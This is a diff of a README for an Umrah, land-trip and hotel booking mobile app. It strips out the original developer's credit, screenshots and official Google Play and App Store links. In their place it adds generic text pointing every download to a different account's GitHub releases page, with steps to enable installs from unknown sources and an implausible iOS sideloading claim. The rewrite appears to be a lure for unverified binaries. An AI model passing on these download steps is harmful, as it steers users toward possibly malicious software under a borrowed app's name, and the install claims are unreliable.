@@ -1,62 +1,70 @@
-# 📌 Nor-Elmasa | نور الماسة
+# 🌟 Nor-Elmasa-App - Simplify Your Umrah Experience
 
-An innovative mobile application in the field of religious tourism and Umrah organization, making it easy for users to book complete Umrah trips, land trips, and hotels in the holy cities in a simple and secure way.
+[![Download Nor-Elmasa-App](https://img.shields.io/badge/Download_Nor-Elmasa--App-v1.0-<COLOR>.svg)](https://github.com/cualaman/Nor-Elmasa-App/releases)
 
-🧳 For users:
-• Choose the type of trip (land trips, Umrah trips, hotel bookings).
-• Display available dates via an interactive calendar and trip details with automatic cost calculation.
-• Multiple Umrah packages (e.g., VIP, Standard, Pro) with different features.
-• Automatic passport scanning to extract data with the option to rescan.
-• Comprehensive confirmation of all details before payment (partial or full).
+## 📖 Overview
 
-**Key Features** 
+Nor-Elmasa-App is an innovative mobile application designed for religious tourism and Umrah organization. This app allows you to book complete Umrah trips, land trips, and hotels in the holy cities easily and securely. Whether you are a first-time traveler or a seasoned pilgrim, this app provides the tools you need for a smooth experience.
 
-- **Land Trips Booking**: Display a calendar for available dates, trip details, specify the number of individuals, cost calculation, then secure payment.
+## 📲 Key Features
 
-- **Umrah Trips Booking**: Calendar for available Umrah dates, display multiple packages (VIP, Standard, Pro) with feature details, specify the number of individuals, rooms, and room types, passport scanning using OCR technology for automatic data extraction (with rescan option), comprehensive confirmation screen for booking data, passports, rooms, persons, and total cost, partial or full payment.
+- **User-Friendly Interface:** Intuitive design for ease of use.
+- **Comprehensive Booking:** Plan your entire trip, including flights, accommodations, and transportation.
+- **Secure Transactions:** Your data is safe with our robust security measures.
+- **Real-Time Updates:** Get the latest information on your bookings and travel arrangements.
+- **Responsive Design:** Works seamlessly on both Android and iOS devices.
 
-- **Hotel Booking**: Support for 4 main cities, filter by city, view hotel details, rooms, and capacity per room, booking and payment via a secure payment gateway.
+## 🚀 Getting Started
 
-- **Additional Features**: Instant notifications, a screen displaying the user's past and current bookings, full authentication system (login, registration, password reset/update, OTP verification, profile viewing and editing).
+Follow these steps to download and run the Nor-Elmasa-App.
 
-**Key Features** 
+1. **Visit the Releases Page**  
+   Go to the following link to access the download options:  
+   [Download Nor-Elmasa-App](https://github.com/cualaman/Nor-Elmasa-App/releases)
 
----
+2. **Choose Your Version**  
+   Find the latest version of the app. Select the file suitable for your device. You can find options for both Android and iOS.
 
+3. **Download the App**  
+   Click on the download link to save the file to your device.
 
-## 🎨 App Screenshots (Mockups / Live)
+4. **Install the App**  
+   - For **Android:** Locate the downloaded APK file using your device's file manager. Tap on the file to begin the installation. You may need to allow installations from unknown sources in your settings.
+   - For **iOS:** After downloading, follow the prompts to install the app from your device.
 
-| #1 | #2 | #3 | #4 | #5 | #6 | #7 |
-| --- | --- | --- | --- | --- | --- | --- |
-| ![Noor Al-Masah 1](https://github.com/user-attachments/assets/46a449e9-77e4-485d-b25e-f88d5ef39d11) | ![Noor Al-Masah 2](https://github.com/user-attachments/assets/2af3bff7-cc41-4d08-95c4-f1fbcb9c21f6) | ![Noor Al-Masah 3](https://github.com/user-attachments/assets/05094ec2-205d-4a2a-a528-62178092fcc1) | ![Noor Al-Masah 4](https://github.com/user-attachments/assets/c50fef9a-fb9b-4374-ae59-62a4755a9bdb) | ![Noor Al-Masah 5](https://github.com/user-attachments/assets/130ff529-8a6b-414f-ab0d-9bf5a64d6789) | ![Noor Al-Masah 6](https://github.com/user-attachments/assets/e842ead3-e647-4884-9f8e-afc9e86e7404) | ![Noor Al-Masah 7](https://github.com/user-attachments/assets/5b0b1fd0-2088-4ab8-99a1-2ba7516e6f35) |
-| #8 | #9 | #10 | #11 | #12 | #13 | #14 |
-| --- | --- | --- | --- | --- | --- | --- |
-| ![Noor Al-Masah 8](https://github.com/user-attachments/assets/7451b758-b036-49f1-bd5d-3516d51a7be7) | ![Noor Al-Masah 9](https://github.com/user-attachments/assets/5f5d89b1-9d90-44a6-8d7b-39c48cfb3439) | ![Noor Al-Masah 10](https://github.com/user-attachments/assets/b040dd41-22fb-4d0f-b346-843e0c2ea430) | ![Noor Al-Masah 11](https://github.com/user-attachments/assets/8a528259-4557-41d6-9aa5-a049e29b9b28) | ![Noor Al-Masah 12](https://github.com/user-attachments/assets/4e286eea-b4a4-4dcc-a691-0e5c3e4d4b64) | ![Noor Al-Masah 13](https://github.com/user-attachments/assets/827893b9-fd36-44ba-9aab-0055cb169ad5) | ![Noor Al-Masah 14](https://github.com/user-attachments/assets/cf9f9791-185c-488e-a20c-e85ed6729215) |
-| #15 | #16 | #17 | #18 | #19 |
-| --- | --- | --- | --- | --- |
-| ![Noor Al-Masah 15](https://github.com/user-attachments/assets/f2bfa983-63ad-4b8c-8760-99ee57aa7646) | ![Noor Al-Masah 16](https://github.com/user-attachments/assets/2ba1c37c-5cc0-4fc0-94ec-dccb9525cead) | ![Noor Al-Masah 17](https://github.com/user-attachments/assets/1ec4024d-7d18-4d9f-9bfc-ddabfd5b48b9) | ![Noor Al-Masah 18](https://github.com/user-attachments/assets/feb2b061-5656-4667-8a57-8c1cd5306470) | ![Noor Al-Masah 19](https://github.com/user-attachments/assets/ffc408f2-f299-42f3-a30e-e742287ca480) |
+5. **Open the App**  
+   Once installed, find the Nor-Elmasa-App icon on your home screen or app drawer. Tap to open it.
 
+6. **Create Your Account**  
+   Follow the instructions on the screen to create your account. You will need to provide some basic information.
 
----
+7. **Start Booking**  
+   Once logged in, explore the app. You can search for Umrah trips, land packages, and hotels. Complete your bookings securely through the app.
 
-## 📱 Download the App
+## 📥 Download & Install
 
+To download Nor-Elmasa-App, [visit this page](https://github.com/cualaman/Nor-Elmasa-App/releases) and grab the latest version tailored for your device.
 
-| Platform    | Status                         | Link                                                                                                                                                                                                        |
-|-------------|--------------------------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
-| Google Play | **Live** 🚀 | <a href="https://play.google.com/store/apps/details?id=com.bandtech.noorAlmasa&pcampaignid=web_share"><img src="https://play.google.com/intl/en_us/badges/static/images/badges/en_badge_web_generic.png" alt="Get it on Google Play" width="200" height="60" /></a> |
-| App Store   | **Live** 🚀 | <a href="https://apps.apple.com/us/app/%D9%86%D9%88%D8%B1-%D8%A7%D9%84%D9%85%D8%A7%D8%B3%D8%A9/id6754540720"><img src="https://developer.apple.com/assets/elements/badges/download-on-the-app-store.svg" alt="Download on the App Store" width="200" height="60" /></a>    |
+## 🛠 System Requirements
 
----
+- **Android:** Android 5.0 (Lollipop) or later
+- **iOS:** iOS 11.0 or later
 
-## 👨‍💻 About the Developer
+## 📞 Support
 
-This project was fully developed by:  
-**Hussein Elbhrawy** – Software Engineer & Mobile App Developer
+If you encounter any issues, please check the FAQ section in the app or contact our support team through the app settings. We are here to help you make the most out of your journey.
 
-[![Website](https://img.shields.io/badge/Website-Visit-blue?style=for-the-badge&logo=globe&logoColor=white)](https://husseinelbhrawy.vercel.app/) [![LinkedIn](https://img.shields.io/badge/LinkedIn-Connect-blue?style=for-the-badge&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/husseinelbhrawy/)[![GitHub](https://img.shields.io/badge/GitHub-Follow-black?style=for-the-badge&logo=github)](https://github.com/HusseinElbhrawy)
+## 🏷️ Topics Covered
 
----
+- android
+- api
+- app
+- flutter
+- ios
+- mobile
+- ocr
+- ocr-recognition
+- reservation-system
+- responsive-design
 
-_Thank you for your interest in the project! Feel free to reach out via [LinkedIn](https://www.linkedin.com/in/husseinelbhrawy/) for any inquiries or potential collaborations._
-
+Enjoy your journey with Nor-Elmasa-App, where we make religious tourism simpler and more secure for you.
